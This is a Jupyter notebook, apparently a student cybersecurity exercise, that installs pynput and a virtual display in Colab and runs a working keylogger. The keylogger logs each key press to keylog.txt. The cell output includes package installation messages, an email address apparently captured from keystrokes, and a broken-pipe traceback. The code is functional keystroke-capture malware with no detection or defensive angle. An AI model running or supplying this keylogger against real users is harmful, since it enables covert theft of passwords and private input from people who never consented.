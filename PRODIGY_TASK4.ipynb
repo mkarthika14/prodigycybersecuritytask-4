{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UrPMl07hQBSF",
        "outputId": "bb9d1dbf-67eb-4d56-a747-4a83dd11b1eb"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "xvfb is already the newest version (2:21.1.4-2ubuntu1.7~22.04.11).\n",
            "0 upgraded, 0 newly installed, 0 to remove and 49 not upgraded.\n",
            "Requirement already satisfied: pyvirtualdisplay in /usr/local/lib/python3.10/dist-packages (3.0)\n",
            "Requirement already satisfied: pynput in /usr/local/lib/python3.10/dist-packages (1.7.7)\n",
            "Requirement already satisfied: six in /usr/local/lib/python3.10/dist-packages (from pynput) (1.16.0)\n",
            "Requirement already satisfied: evdev>=1.3 in /usr/local/lib/python3.10/dist-packages (from pynput) (1.7.1)\n",
            "Requirement already satisfied: python-xlib>=0.17 in /usr/local/lib/python3.10/dist-packages (from pynput) (0.33)\n",
            "mkarthika1106@gmail.com\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Exception in thread Thread-11:\n",
            "Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.10/dist-packages/Xlib/protocol/display.py\", line 583, in send_and_recv\n",
            "    i = self.socket.send(self.data_send)\n",
            "BrokenPipeError: [Errno 32] Broken pipe\n",
            "\n",
            "During handling of the above exception, another exception occurred:\n",
            "\n",
            "Traceback (most recent call last):\n",
            "  File \"/usr/lib/python3.10/threading.py\", line 1016, in _bootstrap_inner\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<pyvirtualdisplay.display.Display at 0x79f0fdbe6770>"
            ]
          },
          "metadata": {},
          "execution_count": 3
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "    self.run()\n",
            "  File \"/usr/local/lib/python3.10/dist-packages/pynput/_util/__init__.py\", line 211, in run\n",
            "    self._run()\n",
            "  File \"/usr/local/lib/python3.10/dist-packages/pynput/keyboard/_xorg.py\", line 559, in _run\n",
            "    super(Listener, self)._run()\n",
            "  File \"/usr/local/lib/python3.10/dist-packages/pynput/_util/xorg.py\", line 417, in _run\n",
            "    "
          ]
        }
      ],
      "source": [
        "!apt-get install xvfb  # Install Xvfb if you haven't already\n",
        "!pip install pyvirtualdisplay # Install pyvirtualdisplay to manage virtual displays\n",
        "!pip install pynput # Install the pynput module\n",
        "\n",
        "from pyvirtualdisplay import Display\n",
        "import os # Import the 'os' module to interact with environment variables\n",
        "# Create a virtual display\n",
        "display = Display(visible=0, size=(800, 600))\n",
        "display.start()\n",
        "\n",
        "# Set the DISPLAY environment variable to point to the virtual display\n",
        "os.environ['DISPLAY'] = ':' + str(display.display) # This line is crucial for pynput to find the display\n",
        "\n",
        "from pynput import keyboard # Import pynput.keyboard after setting the display variable\n",
        "import time\n",
        "\n",
        "\n",
        "def keyPressed(key):\n",
        "    print(str(key))\n",
        "    with open(\"keylog.txt\", 'a') as logkey:\n",
        "        try:\n",
        "           char = key.char\n",
        "           logkey.write(char)\n",
        "        except:\n",
        "            print(\"Error getting char\")\n",
        "\n",
        "if __name__==\"__main__\":\n",
        "    listener = keyboard.Listener(on_press=keyPressed)\n",
        "    listener.start()\n",
        "    input()  # Keep the script running until you press Enter\n",
        "\n",
        "# Stop the virtual display when done\n",
        "display.stop()"
      ]
    }
  ]
}